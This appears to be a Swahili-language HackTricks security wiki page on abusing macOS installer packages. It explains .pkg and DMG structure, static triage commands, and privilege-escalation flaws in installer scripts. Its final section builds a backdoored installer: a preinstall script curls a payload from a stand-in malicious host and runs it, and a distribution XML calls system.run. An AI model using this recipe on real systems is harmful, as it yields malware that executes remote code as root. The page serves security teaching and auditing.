# Abuse ya macOS Installers

{{#include ../../../banners/hacktricks-training.md}}

## Taarifa za Msingi za Pkg

**installer package** ya macOS (pia hujulikana kama faili la `.pkg`) ni muundo wa faili unaotumiwa na macOS **kusambaza software**. Faili hizi ni kama **sanduku lenye kila kitu ambacho kipande cha software** kinahitaji ili kusakinishwa na kufanya kazi kwa usahihi.

Faili la package lenyewe ni archive inayohifadhi **hierarchy ya mafaili na directories zitakazosakinishwa kwenye** computer **lengwa**. Pia linaweza kujumuisha **scripts** za kutekeleza majukumu kabla na baada ya installation, kama vile kusanidi mafaili ya configuration au kuondoa matoleo ya zamani ya software.

### Muundo wa Package

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations (title, welcome text…) na ukaguzi wa script/installation
- **PackageInfo (xml)**: Taarifa, mahitaji ya installation, eneo la installation, paths za scripts za kuendesha
- **Bill of materials (bom)**: Orodha ya mafaili ya kusakinisha, kusasisha au kuondoa pamoja na file permissions
- **Payload (CPIO archive gzip compressed)**: Mafaili ya kusakinisha kwenye `install-location` kutoka PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Pre na post install scripts pamoja na resources nyingine zilizotolewa kwenye temp directory kwa ajili ya execution.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Ili kuonyesha yaliyomo kwenye installer bila ku-decompress mwenyewe, unaweza pia kutumia tool ya bure [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Njia za mkato za static triage

Ikiwa lengo ni kufanya analysis, jaribu **kuepuka kufungua package kwa `Installer.app` kwanza**. Baadhi ya packages zinaweza kutekeleza code mara tu Installer inapozifungua (kwa mfano kupitia `system.run()` au installer plug-ins), kwa hiyo offline extraction huwa mwanzo salama zaidi.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Taarifa za Msingi kuhusu DMG

Faili za DMG, au Apple Disk Images, ni aina ya faili inayotumiwa na Apple's macOS kwa disk images. Faili ya DMG kimsingi ni **mountable disk image** (ina filesystem yake) inayohifadhi block data mbichi ambayo kwa kawaida imebanwa na wakati mwingine imesimbwa kwa njia fiche. Unapofungua faili ya DMG, macOS hui-**mount** kana kwamba ni **disk ya kimwili**, hivyo kukuruhusu kufikia yaliyomo.

> [!CAUTION]
> Kumbuka kwamba installers za **`.dmg`** zinaunga mkono **formats nyingi sana**, kiasi kwamba hapo awali baadhi yake zilizokuwa na vulnerabilities zilitumiwa kupata **kernel code execution**.

### Muundo wa Disk Image

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Hierarchy ya faili ya DMG inaweza kutofautiana kulingana na yaliyomo. Hata hivyo, kwa application DMGs, kwa kawaida hufuata muundo huu:

- Top Level: Hii ni root ya disk image. Mara nyingi huwa na application na huenda pia ikawa na link ya Applications folder.
- Application (.app): Hii ndiyo application yenyewe. Katika macOS, application kwa kawaida ni package iliyo na faili na folders nyingi za kibinafsi zinazounda application.
- Applications Link: Hii ni shortcut ya Applications folder katika macOS. Madhumuni yake ni kurahisisha kusakinisha application. Unaweza kuburuta faili ya .app hadi kwenye shortcut hii ili kusakinisha app.

## Privesc kupitia pkg abuse

### Execution kutoka public directories

Ikiwa pre- au post-installation script itatekeleza faili kama **`/var/tmp/Installerutil`** na attacker anaweza kubadilisha faili hiyo, attacker anaweza kufanya privilege escalation wakati installer inapoiita. Maelezo na walkthrough zinaonyesha variants za insecure external-script pattern hii.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Hii ni [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) ambayo installers na updaters kadhaa huiita ili **kutekeleza kitu kama root**. Function hii hupokea **path** ya **file** ya **kutekeleza** kama parameter; hata hivyo, ikiwa attacker angeweza **kubadilisha** faili hii, angeweza **kutumia vibaya** execution yake yenye root ili **kufanya privilege escalation**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Kwa maelezo zaidi tazama mazungumzo haya: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Matumizi mabaya ya Environment na shebang

Bugs za kisasa za PackageKit zilionyesha kuwa installer scripts mara nyingi huendeshwa kama **trusted root code**, huku bado zikihifadhi context inayodhibitiwa na attacker karibu. Unapofanya ukaguzi wa vendor packages, zingatia hasa:

- Shell interpreters kama `#!/bin/zsh` / `#!/bin/bash`
- Calls kama `sudo -u $USER`, `launchctl asuser`, au logic yoyote inayoamini `$USER`, `$HOME`, `PATH`, `TMPDIR`, au relative paths
- Non-shell interpreters ambazo zinaweza kupakia init files au libraries zinazodhibitiwa na user
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Kwa hitilafu ya PackageKit ya root-environment ya 2024 (urithi wa `~/.zshenv` / `~/.bash*` wakati wa installs zinazoanzishwa na mtumiaji), angalia [ukurasa wa jumla wa macOS privesc](../macos-privilege-escalation.md). Ikiwa package **imesainiwa na Apple**, hitilafu hiyo hiyo ya script inaweza kuwa muhimu kwa **SIP/TCC** kwa sababu `system_installd` inaweza kuwa na `com.apple.rootless.install.heritable`; angalia [ukurasa wa SIP](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Utekelezaji kwa mounting

Ikiwa installer inaandika kwenye `/tmp/fixedname/bla/bla`, inawezekana **kuunda mount** juu ya `/tmp/fixedname` kwa kutumia noowners, ili uweze **kubadilisha faili yoyote wakati wa installation** na kutumia vibaya mchakato wa installation.

Mfano wa hili ni **CVE-2021-26089**, ambayo iliweza **kuandika upya periodic script** na kupata execution kama root. Kwa maelezo zaidi, tazama talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg kama malware

### Empty Payload

Inawezekana tu kutengeneza faili ya **`.pkg`** yenye **pre na post-install scripts** bila payload halisi yoyote, isipokuwa malware iliyo ndani ya scripts.<sup>[[2]](#references)</sup>

### JS katika Distribution xml

Inawezekana kuongeza tags za **`<script>`** kwenye faili ya **distribution xml** ya package, na code hiyo ita-execute; inaweza pia **ku-execute commands** kwa kutumia **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Katika distribution packages, hii kwa kawaida hutegemea faili ya kiwango cha juu `Distribution` kuwezesha external scripts, kwa mfano kwa `allow-external-scripts="true"`. Kwa hiyo, kukagua `preinstall` / `postinstall` pekee hakutoshi: **Distribution XML yenyewe** inaweza kuwa na hooks za `installation-check` / `volume-check` na execution paths za moja kwa moja kupitia `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Kisakinishi chenye Backdoor

Kisakinishi hasidi kinachotumia script na code ya JS ndani ya dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Kufungua Pkgs: Kuangalia Ndani ya Macos Installer Packages na Dosari za Kawaida za Usalama](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "Ulimwengu wa Kichaka wa macOS Installers" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Kufungua Pkgs: Kuangalia Ndani ya MacOS Installer Packages](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – Red Teaming ya macOS: Kutumia Installer Packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: Kuongeza Privilege kwenye macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Kuvunja SIP kwa Apple-signed Packages](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Mlima wa Bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Kifo kwa Installers 1000 kwenye macOS na Kila Kitu Kimeharibika!](https://www.youtube.com/watch?v=lTOItyjTTkw)
{{#include ../../../banners/hacktricks-training.md}}
